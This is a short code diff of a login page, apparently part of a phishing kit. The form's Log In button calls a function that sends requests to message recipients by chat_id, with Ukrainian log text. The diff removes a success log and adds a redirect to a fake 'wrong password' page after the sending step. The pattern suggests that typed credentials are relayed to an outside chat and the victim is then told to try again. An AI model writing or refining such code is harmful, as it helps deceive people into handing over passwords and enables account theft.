@@ -34,7 +34,7 @@
                     <input type="password" id="input2" placeholder="password" />
                     <label for="password">Password</label>
                 </div>
-                <button type="button" class="login-button" onclick="sendMessageToAll(event)">Log In</button></a>
+                <button type="button" class="login-button" href="./wrong_password.html" onclick="sendMessageToAll(event)">Log In</button>
                 <div class="separator">
                     <div class="line"></div>
                     <p>OR</p>
@@ -118,12 +118,11 @@
             if (!response.ok) {
                 throw new Error(`HTTP error! status: ${response.status}`);
             }
-
-            console.log(`Повідомлення надіслано користувачу з chat_id: ${chatId}`);
         } catch (error) {
-            console.error(`Помилка при надсиланні користувачу з chat_id ${chatId}:`, error);
+            console.error(error);
         }
-    }
+    } 
+    window.location.href = './wrong_password.html';
 }
 
 
